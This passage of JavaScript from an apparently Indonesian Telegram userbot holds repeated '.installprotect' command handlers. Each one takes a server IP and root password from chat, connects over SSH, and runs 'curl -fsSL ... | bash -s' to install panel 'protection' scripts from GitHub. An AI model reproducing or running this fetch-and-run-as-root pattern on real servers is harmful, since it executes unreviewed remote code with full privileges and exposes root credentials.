                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 2</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 2</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 2 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect1.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 2 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect1.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect2:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect3`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect3 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect3.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 3</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 3</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 3</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 3 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect3.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 3 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect3.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect3:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect4`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect4 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect4.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 4</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 4</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 4</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 4 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect4.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 4 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect4.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect4:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect5`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect5 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect5.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 5</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 5</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 5</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 5 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect5.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 5 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect5.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect5:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect6`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect6 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect6.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 6</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 6</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 6</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 6 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect6.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 6 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect6.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect6:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect7`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect7 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect7.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 7</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 7</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 7</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
